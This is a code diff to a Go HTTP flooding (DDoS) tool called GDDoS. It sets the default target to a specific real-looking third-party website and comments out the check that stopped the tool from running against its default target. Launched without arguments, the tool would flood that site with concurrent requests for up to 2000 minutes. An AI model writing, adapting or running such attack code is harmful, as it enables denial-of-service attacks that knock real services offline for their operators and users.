@@ -72,7 +72,7 @@ var (
 
 // Main Function
 func main() {
-	defaultTargetUrl := "https://peter1303.top/" // Bye @Peter1303, i don't mean it!
+	defaultTargetUrl := "https://kzkt.tianyuyun.com/static/h5_new_4.6.5.115/index.html" // Bye @Peter1303, i don't mean it!
 
 	flag.StringVar(&Method, "m", "GET", "DDoS Method(GET/POST/HEAD/...)")
 	flag.StringVar(&TargetUrl, "u", defaultTargetUrl, "Taget URL")
@@ -81,11 +81,11 @@ func main() {
 	flag.IntVar(&DurationMinute, "dm", 2000, "Attack Duration time(Minutes)")
 	flag.Parse()
 
-	if TargetUrl == defaultTargetUrl {
+	/*if TargetUrl == defaultTargetUrl {
 		fmt.Printf("TargetUrl is %s, 请尝试通过命令行重传参数启动(TargetUrl 不能等于 defaultTargetUrl). Usage：./GDDoS -h\n", TargetUrl)
 		return
 	}
-
+	*/
 	go func() {
 		for i := 0; i < ConcurrencyCount; i++ {
 			go DoAttacking(i)
@@ -93,7 +93,6 @@ func main() {
 	}()
 	time.Sleep(time.Duration(DurationMinute) * time.Minute)
 }
-
 
 func DoAttacking(grindex int) {
 	for i := 0; ; i++ {
